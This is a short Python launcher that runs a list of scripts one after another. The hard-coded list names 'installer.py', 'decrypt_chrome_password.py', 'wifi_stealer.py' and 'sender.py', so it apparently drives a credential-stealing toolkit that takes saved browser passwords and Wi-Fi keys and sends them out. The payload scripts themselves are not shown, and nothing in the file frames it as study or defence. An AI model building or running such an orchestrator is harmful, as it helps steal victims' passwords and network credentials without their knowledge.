import subprocess

def run_scripts_from_list(scripts):
    for script in scripts:
        print(f"Launching {script}...")
        try:
            subprocess.run(["python", "scripts/" + script], check=True) 
        except subprocess.CalledProcessError as e:
            print(f"Execution error {script}: {e}")

def run_scripts_from_file(filename):
    try:
        with open(filename, "r", encoding="utf-8") as file:
            scripts = [line.strip() for line in file if line.strip()]
        run_scripts_from_list(scripts)
    except FileNotFoundError:
        print(f"File {filename} not found.")

if __name__ == "__main__":
    # Option 1: list of scripts in code
    scripts = ["installer.py", "decrypt_chrome_password.py", "wifi_stealer.py", "sender.py"]
    run_scripts_from_list(scripts)
    
    # Option 2: list in a file (one per line)
    # run_scripts_from_file("scripts.txt")
